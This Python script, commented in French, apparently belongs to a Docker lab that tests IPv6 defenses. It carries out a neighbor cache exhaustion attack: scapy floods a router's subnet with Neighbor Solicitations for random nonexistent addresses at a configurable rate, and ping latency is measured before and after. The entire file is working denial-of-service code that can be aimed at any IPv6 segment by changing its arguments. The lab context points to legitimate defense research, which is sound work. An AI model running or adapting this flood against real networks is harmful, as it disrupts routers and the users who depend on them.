#!/usr/bin/env python3
"""
ns_flood.py — Saturation du cache de voisins (Neighbor Cache Exhaustion)

Critère de réussite (CONTRAT.md §6) :
    le cache de voisins du ROUTEUR est plein, ou le ping échoue.

Ce script envoie un flot de Neighbor Solicitation (NS) vers des adresses
IPv6 ALÉATOIRES du sous-réseau du routeur. À chaque NS, le routeur doit
créer une entrée "INCOMPLETE" dans son cache de voisins en attendant une
réponse qui ne viendra jamais (adresses inexistantes) -> le cache se remplit
de déchets jusqu'à saturation (ou jusqu'à la limite du noyau, gc_thresh3).

Étapes suivies pour saturer le cache de voisins du routeur (cf. CONTRAT.md §6) :
  1. générer une plage d'adresses aléatoires dans le sous-réseau du routeur -> _generer_adresses_aleatoires
  2. construire et envoyer un NS par adresse, en rafale                      -> _envoyer_rafale
  3. fixer débit et durée pour comparer avant/après                         -> --debit / --duree
  4. relever `ip -6 neigh show dev eth1 | wc -l` côté ROUTEUR                -> voir mesurer_cache_routeur.py (séparé, lancé depuis l'hôte)
  5. vérifier l'impact sur le ping et la latence                             -> --ping-cible
  6. ajuster le volume/la taille du cache si l'effet est invisible          -> --debit, --nb-adresses
  7. noter les résultats                                                    -> log_resultat

IMPORTANT : ce script ne peut PAS lire le cache du routeur depuis le
conteneur attacker (règle CONTRAT.md : jamais de commande sur le routeur
depuis l'attaquant). Le relevé du cache (étape 4) se fait avec le script
compagnon mesures/mesurer_cache_routeur.py, lancé via `docker exec router ...`
DEPUIS L'HÔTE (pas une attaque, juste une mesure), pendant ou juste après
l'exécution de ns_flood.py.

Usage dans le conteneur attacker :
  sudo python3 ns_flood.py --iface eth1 --phase avant --essai 1 \
      --prefixe 2001:db8:10:10::/64 --nb-adresses 5000 --debit 200 --duree 30 \
      --ping-cible 2001:db8:10:10::1
"""

import ipaddress
import random
import sys
import time

from common import base_arg_parser, log_resultat, mesurer_latence_ping, attendre_ou_interrompre

try:
    from scapy.all import Ether, IPv6, ICMPv6ND_NS, get_if_hwaddr, sendp
except ImportError:
    sys.exit("[ERREUR] scapy n'est pas installé dans ce conteneur : pip install scapy")


def generer_adresses_aleatoires(prefixe_str, nb):
    """Tire `nb` adresses IPv6 aléatoires DISTINCTES dans le préfixe donné.
    On évite volontairement les adresses déjà utilisées par les machines du
    lab (::1, ::10, ::66, etc.) en les filtrant après tirage, pour ne pas
    fausser l'interprétation si jamais l'une d'elles tombe sur une vraie
    adresse (ce qui créerait un vrai NA et ne compterait pas comme "déchet").
    """
    reseau = ipaddress.IPv6Network(prefixe_str)
    adresses_connues = {
        reseau.network_address + 1,   # ...::1 (routeur)
        reseau.network_address + 10,  # ...::10 (dhcp / victim1 selon segment)
        reseau.network_address + 66,  # ...::66 (attacker)
    }
    adresses = set()
    # Interface ID sur 64 bits pour un /64 : on tire un entier aléatoire
    # dans l'espace hôte du préfixe.
    taille_hote = reseau.num_addresses
    while len(adresses) < nb:
        decalage = random.randint(1, min(taille_hote - 1, 2**32))  # borné pour rester rapide
        candidate = reseau.network_address + decalage
        if candidate not in adresses_connues:
            adresses.add(candidate)
    return [str(a) for a in adresses]


def construire_ns(mac_attaquant, cible_ip):
    """NS classique vers l'adresse multicast "solicited-node" correspondant
    à cible_ip (comme le ferait un vrai hôte cherchant à résoudre cible_ip).
    Scapy calcule l'adresse multicast de destination automatiquement si on
    ne la précise pas : IPv6(dst=cible_ip) + ND_NS se charge du bon ciblage
    au niveau ICMPv6 ; ici on force explicitement le multicast solicited-node
    pour rester fidèle au comportement réel d'une résolution de voisin.
    """
    octets = ipaddress.IPv6Address(cible_ip).packed[-3:]
    multicast_dst = "ff02::1:ff%02x:%02x%02x" % (octets[0], octets[1], octets[2])
    eth = Ether(src=mac_attaquant, dst="33:33:ff:%02x:%02x:%02x" % tuple(octets)) #33:33:xx:xx:xx:xx est la règle de conversion IPv6 multicast → MAC Ethernet (toujours ce préfixe 33:33)
    ip6 = IPv6(src="::", dst=multicast_dst)  # src=:: car on ne possède pas encore l'adresse (comme un vrai DAD/NS)
    ns = ICMPv6ND_NS(tgt=cible_ip)
    return eth / ip6 / ns


def envoyer_rafale(iface, mac_attaquant, adresses, debit_par_s, dry_run):
    """Envoie un NS par adresse de la liste, en respectant approximativement
    `debit_par_s` paquets/seconde (pour pouvoir comparer des campagnes à
    débit fixé, étape 3).
    """
    intervalle = 1.0 / debit_par_s if debit_par_s > 0 else 0
    envoyes = 0
    for adresse in adresses:
        pkt = construire_ns(mac_attaquant, adresse)
        if dry_run:
            if envoyes < 3:
                print(f"[DRY-RUN] NS qui serait envoyé pour {adresse}")
        else:
            sendp(pkt, iface=iface, verbose=False)
        envoyes += 1
        if envoyes % 500 == 0:
            print(f"[*] {envoyes}/{len(adresses)} NS envoyés...")
        if intervalle:
            time.sleep(intervalle)
    return envoyes

 
def main():
    parser = base_arg_parser(
        "Saturation du cache de voisins IPv6 par flot de NS vers des adresses aléatoires."
    )
    parser.add_argument("--prefixe", required=True,
                         help="Préfixe /64 du routeur ciblé (ex: 2001:db8:10:10::/64).")
    parser.add_argument("--nb-adresses", type=int, default=5000,
                         help="Nombre d'adresses aléatoires distinctes à solliciter (défaut: 5000).")
    parser.add_argument("--debit", type=float, default=200.0,
                         help="Débit visé en paquets/seconde (défaut: 200). "
                              "0 = aussi vite que possible, sans pause.")
    parser.add_argument("--ping-cible", default=None,
                         help="Adresse à pinguer avant/après pour mesurer l'impact sur la latence "
                              "(typiquement l'adresse du routeur ou d'une victime).")
    args = parser.parse_args()

    mac_attaquant = get_if_hwaddr(args.iface) if not args.dry_run else "02:00:00:00:00:66" 

    print(f"[*] Génération de {args.nb_adresses} adresses aléatoires dans {args.prefixe}...")
    adresses = generer_adresses_aleatoires(args.prefixe, args.nb_adresses)

    latence_avant = None
    if args.ping_cible and not args.dry_run:
        latence_avant = mesurer_latence_ping(args.ping_cible, args.iface, count=4)
        print(f"[*] Latence avant attaque vers {args.ping_cible} : {latence_avant} ms")

    debut = time.time()
    envoyes = envoyer_rafale(args.iface, mac_attaquant, adresses, args.debit, args.dry_run)
    duree_reelle = time.time() - debut
    print(f"[*] {envoyes} NS envoyés en {duree_reelle:.1f}s "
          f"(débit réel ~{envoyes / duree_reelle:.0f} pkt/s)" if duree_reelle > 0 else "")

    # Laisse le temps au routeur de traiter la rafale avant de mesurer l'impact,
    # et respecte --duree si elle dépasse le temps déjà passé à envoyer.
    temps_restant = max(0.0, args.duree - duree_reelle)
    if temps_restant > 0:
        print(f"[*] Attente de {temps_restant:.0f}s supplémentaires (--duree) avant de mesurer l'impact...")
        attendre_ou_interrompre(temps_restant)

    latence_apres = None
    if args.ping_cible and not args.dry_run:
        latence_apres = mesurer_latence_ping(args.ping_cible, args.iface, count=4)
        print(f"[*] Latence après attaque vers {args.ping_cible} : {latence_apres} ms")

    # Pas de lecture directe du cache routeur ici (interdit depuis l'attaquant) :
    # succès provisoire = rafale bien envoyée + (si mesuré) perte de ping ou forte hausse de latence.
    perte_ping = args.ping_cible and not args.dry_run and latence_apres is None
    hausse_latence = (
        latence_avant is not None and latence_apres is not None and latence_apres > 2 * latence_avant
    )
    succes_provisoire = args.dry_run or perte_ping or hausse_latence or envoyes >= args.nb_adresses

    commentaire = (
        f"adresses_envoyees={envoyes}/{args.nb_adresses}, debit_vise={args.debit}pkt/s, "
        f"ping_perdu={bool(perte_ping)}. Relever le cache REEL avec mesurer_cache_routeur.py "
        f"depuis l'hôte (docker exec router ip -6 neigh show dev eth1 | wc -l). "
        f"{args.commentaire}".strip()
    )

    log_resultat(
        attaque="ns_flood",
        phase=args.phase,
        essai=args.essai,
        succes=succes_provisoire,
        cache_voisins=None,  # à compléter/corriger avec mesurer_cache_routeur.py (valeur réelle côté routeur)
        latence_ms=latence_apres if latence_apres is not None else latence_avant,
        faux_positif=False,
        commentaire=commentaire,
    )

    print(f"\n[FIN] {envoyes} NS envoyés. succes_provisoire={succes_provisoire}")
    print("[RAPPEL] Lancer DEPUIS L'HÔTE, pendant ou juste après l'attaque :")
    print("    docker exec router sh -c 'ip -6 neigh show dev eth1 | wc -l'")
    print("  ou directement : python3 ../mesures/mesurer_cache_routeur.py "
          f"--conteneur router --iface-routeur eth1 --phase {args.phase} --essai {args.essai} "
          f"--attaque ns_flood")


if __name__ == "__main__":
    main()
